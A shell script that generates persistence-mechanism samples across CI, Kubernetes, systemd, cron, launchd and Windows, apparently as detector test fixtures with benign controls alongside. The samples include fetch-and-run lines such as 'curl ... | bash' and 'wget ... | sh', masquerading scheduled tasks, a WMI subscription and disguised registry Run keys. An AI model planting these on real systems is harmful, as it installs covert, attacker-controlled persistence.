#!/bin/sh
# Hand-authored persistence descriptors (heredocs / stdlib plistlib WRITER; no lib code). Usage: sh sched_persist_gen.sh <dir>
set -e; d=$1; mkdir -p "$d"; cd "$d"
cat > gha_cron.yml <<'EOF'
name: nightly-sync
on:
  schedule:
    - cron: '*/15 * * * *'
  workflow_dispatch:
jobs:
  beacon:
    runs-on: ubuntu-latest
    steps:
      - run: curl -fsSL https://cdn.example.invalid/u.sh | bash
EOF
cat > gha_loop.yml <<'EOF'
name: Rebuild
on:
  workflow_run:
    workflows: ["Rebuild"]
    types: [completed]
jobs:
  again:
    runs-on: ubuntu-latest
    steps:
      - run: ./collect.sh
EOF
cat > gha_dispatch.yml <<'EOF'
name: ping
on:
  repository_dispatch:
    types: [ping]
jobs:
  pong:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -X POST -H "Authorization: token ${{ secrets.PAT }}" \
            https://api.github.com/repos/${{ github.repository }}/dispatches -d '{"event_type":"ping"}'
EOF
cat > gha_benign.yml <<'EOF'
name: ci
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: make test
EOF
cat > gitlab.yml <<'EOF'
stages: [build, maint]
build:
  stage: build
  script:
    - make
cleanup_cache:
  stage: maint
  rules:
    - if: '$CI_PIPELINE_SOURCE == "schedule"'
  script:
    - ./tools/refresh.sh
EOF
cat > azure.yml <<'EOF'
trigger: none
schedules:
  - cron: "30 2 * * 1-5"
    displayName: weekday refresh
    branches:
      include: [main]
    always: true
pool:
  vmImage: ubuntu-latest
steps:
  - script: ./refresh.sh
EOF
cat > cronjob.yaml <<'EOF'
apiVersion: batch/v1
kind: CronJob
metadata:
  name: log-rotate
  namespace: kube-system
spec:
  schedule: "0 */6 * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
            - name: rotate
              image: busybox:1.36
              command: ["/bin/sh", "-c", "wget -qO- http://10.0.0.5/s | sh"]
          restartPolicy: OnFailure
EOF
cat > updater.timer <<'EOF'
[Unit]
Description=Updater

[Timer]
OnBootSec=2min
OnCalendar=*:0/10
Unit=updater-agent.service

[Install]
WantedBy=timers.target
EOF
cat > sync.timer <<'EOF'
[Timer]
OnUnitActiveSec=1h
EOF
cat > watchdog.service <<'EOF'
[Unit]
Description=watchdog

[Service]
ExecStart=/usr/local/bin/wd --quiet
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF
cat > plain.service <<'EOF'
[Unit]
Description=one shot

[Service]
Type=oneshot
ExecStart=/usr/bin/true
Restart=no
EOF
cat > crontab <<'EOF'
# m h dom mon dow command
@reboot /home/user/.local/bin/agent --daemon
0 4 * * 0 /usr/bin/backup.sh
EOF
cat > cron.d_sysupd <<'EOF'
SHELL=/bin/sh
PATH=/usr/sbin:/usr/bin:/sbin:/bin
*/5 * * * * root /usr/lib/sysupd/check >/dev/null 2>&1
EOF
cat > install.sh <<'EOF'
#!/bin/bash
mkdir -p ~/.cache/.x && cp ./x ~/.cache/.x/x
(crontab -l 2>/dev/null; echo "*/30 * * * * $HOME/.cache/.x/x") | crontab -
EOF
cat > notes.txt <<'EOF'
Inventory 2026
1 2 3 4 5 apples and pears
10 20 30 40 50 boxes
EOF
python3 -I -c "import plistlib,sys;open(sys.argv[1],'wb').write(plistlib.dumps({'Label':'com.apple.softwareupdate.agent','ProgramArguments':['/Users/Shared/.u/u','-q'],'StartInterval':300,'RunAtLoad':True}))" com.apple.softwareupdate.agent.plist
python3 -I -c "import plistlib,sys;open(sys.argv[1],'wb').write(plistlib.dumps({'CFBundleName':'Notes','CFBundleVersion':'1.0'}))" Info.plist
cat > task.xml <<'EOF'
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><URI>\Microsoft\Windows\OneDriveSync</URI></RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition><Interval>PT5M</Interval><StopAtDurationEnd>false</StopAtDurationEnd></Repetition>
      <StartBoundary>2026-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec><Command>powershell.exe</Command><Arguments>-w hidden -f C:\ProgramData\s.ps1</Arguments></Exec>
  </Actions>
</Task>
EOF
cat > boot_task.xml <<'EOF'
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers><BootTrigger><Delay>PT30S</Delay></BootTrigger></Triggers>
  <Actions><Exec><Command>C:\Windows\Temp\svc.exe</Command></Exec></Actions>
</Task>
EOF
cat > persist.bat <<'EOF'
@echo off
schtasks /create /sc minute /mo 5 /tn "WinUpdateCheck" /tr "C:\Users\Public\u.exe" /f
EOF
cat > filter.mof <<'EOF'
#pragma namespace("\\\\.\\root\\subscription")
instance of __EventFilter as $F
{
    Name = "SysUptimeFilter";
    EventNamespace = "root\\cimv2";
    QueryLanguage = "WQL";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";
};
instance of CommandLineEventConsumer as $C
{
    Name = "SysUptimeConsumer";
    CommandLineTemplate = "cmd.exe /c C:\\ProgramData\\b.exe";
};
instance of __FilterToConsumerBinding { Filter = $F; Consumer = $C; };
EOF
cat > benign.mof <<'EOF'
#pragma namespace("\\\\.\\root\\cimv2")
class Demo_Inventory { [key] string Name; uint32 Count; };
instance of Demo_Inventory { Name = "widgets"; Count = 3; };
EOF
cat > run.reg <<'EOF'
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
"OneDriveHelper"="C:\\Users\\Public\\odh.exe /silent"
EOF
cat > runonce.cmd <<'EOF'
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v Cleanup /t REG_SZ /d "C:\Temp\c.exe" /f
EOF
